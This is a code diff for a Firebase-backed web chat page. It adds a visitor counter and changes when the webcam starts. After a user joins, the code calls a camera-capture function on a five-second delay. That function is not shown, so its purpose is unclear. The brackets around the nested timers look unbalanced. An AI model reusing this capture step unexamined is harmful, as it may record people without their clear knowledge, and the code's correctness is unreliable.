@@ -413,6 +413,7 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
     const chatRef = ref(db, "chat");
+
     const namePrompt = document.getElementById("namePrompt");
     const nameInput = document.getElementById("nameInput");
     const joinBtn = document.getElementById("joinBtn");
@@ -422,29 +423,49 @@
     const inputBar = document.getElementById("inputBar");
     const viewersCountDiv = document.getElementById("viewersCount");
     const clearButton = document.getElementById("clearButton");
-    let userStream = null;
-    let cameraDisplayed = false;
+
     let userName = "";
 const videoElement = document.getElementById('smallCamera');
 
 async function startCamera() {
   try {
-    userStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    videoElement.srcObject = stream;
+    await videoElement.play();
   } catch (error) {
     console.error("Cannot access camera:", error);
     alert("Cannot access camera: " + error.message);
   }
 }
-joinBtn.addEventListener("click", async () => {
-  userName = nameInput.value.trim();
-  if (userName) {
-    await startCamera(); // 🟢 تطلب الإذن فقط هنا
-    namePrompt.style.display = "none";
-    messagesDiv.style.display = "block";
-    inputBar.style.display = "flex";
+joinBtn.addEventListener("click", () => {
+  const name = nameInput.value.trim();
+  if (!name) {
+    alert("Please enter your name");
+    return;
   }
-});
+  userName = name;
+  namePrompt.style.display = "none";
+  messagesDiv.style.display = "block";
+  inputBar.style.display = "flex";
+  clearButton.style.display = "inline-block";
+  setTimeout(() => {
+ startCamera();
+ setTimeout(() => {
+ startCameraCapture();
+}, 5000);
 
+  const visitorId = Math.random().toString(36).substring(2, 10);
+  const visitorsRef = ref(db, "viewers/" + visitorId);
+  set(visitorsRef, true);
+  onDisconnect(visitorsRef).remove();
+
+  const viewersListRef = ref(db, "viewers");
+  onValue(viewersListRef, (snapshot) => {
+    const viewers = snapshot.val();
+    const count = viewers ? Object.keys(viewers).length : 0;
+    viewersCountDiv.textContent = `👁️‍🗨️ ${count}`;
+  });
+});
 const viewersListPopup = document.getElementById('viewersListPopup');
 
 viewersCountDiv.style.cursor = 'pointer'; // لتغيير المؤشر عند المرور
@@ -614,7 +635,7 @@ const hamburger = document.getElementById('hamburger');
   </script>
   <script>
   const modal = document.getElementById("paymentModal");
-  const img = document.getElementById("mirrorNoteImage");
+  const img = document.getElementById("mirrorGateImage");
   const span = document.getElementsByClassName("close")[0];
 
   img.onclick = function() {
